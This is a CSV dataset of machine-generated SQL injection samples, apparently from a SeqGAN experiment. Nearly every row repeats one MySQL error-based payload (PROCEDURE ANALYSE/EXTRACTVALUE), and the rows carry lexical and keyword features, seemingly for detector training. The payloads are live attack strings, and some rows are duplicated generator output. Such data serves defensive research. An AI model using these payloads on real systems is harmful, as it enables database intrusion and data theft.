label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1699,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1700,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1701,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1702,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1703,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1704,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1705,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1706,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1707,423.0,32.0,3.7624395481846267,138.0,73.0,164.0,48.0,0.3262411347517731,0.17257683215130024,0.3877068557919622,0.11347517730496454,2.0,2.0,0.0,0.0,0.0,2.0,0.0,30.0,2.0,0.0,10.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1708,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1709,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1710,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1711,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1712,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1713,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1714,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1715,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1716,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1717,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1718,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1719,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1720,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and ')' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1721,389.0,31.0,3.8937744243780825,138.0,73.0,136.0,42.0,0.35475578406169667,0.18766066838046272,0.3496143958868895,0.10796915167095116,4.0,0.0,0.0,0.0,0.0,2.0,0.0,25.0,1.0,0.0,10.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1722,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1723,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1724,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1725,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1726,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1727,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
